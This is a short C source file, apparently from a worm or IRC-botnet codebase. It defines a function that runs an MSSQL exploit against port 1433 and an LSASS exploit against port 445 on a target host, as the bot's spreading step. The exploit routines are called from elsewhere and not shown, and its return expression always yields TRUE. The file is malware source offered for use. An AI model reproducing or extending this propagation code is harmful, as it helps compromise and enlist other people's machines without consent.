//
// some code that scans mssql and lsass by X-Lock
//
// note: absolutely experimental, use at your own risk.
//
//

#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"

#ifndef NO_MSSQL
#ifndef NO_LSASS
#ifndef NO_MSSQLLSASS
BOOL mssqllsass(EXINFO exinfo)
{
	exinfo.port = 1433;
	BOOL bMSSQL = MSSQL(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = Lsass(exinfo);

	return bMSSQL || bLSASS ? TRUE : TRUE;
}
#endif
#endif
#endif